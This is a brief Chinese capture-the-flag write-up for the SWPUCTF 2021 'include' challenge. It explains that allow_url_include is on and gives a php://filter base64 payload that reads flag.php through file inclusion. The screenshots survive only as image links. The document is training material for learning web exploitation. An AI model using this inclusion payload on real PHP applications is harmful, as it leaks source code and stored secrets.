## [SWPUCTF 2021 新生赛]include
![](./pic/传入file.png)

当看到ini_set("allow_url_include","on");设置为on，那我们可以想到可以进行文件包含用伪协议来读取flag.php这个文件
我们来用filter来构造payload：
file=php://filter/read=convert.base64-encode/resource=flag.php
![](./pic/传参.png)
![](./pic/获取flag.png)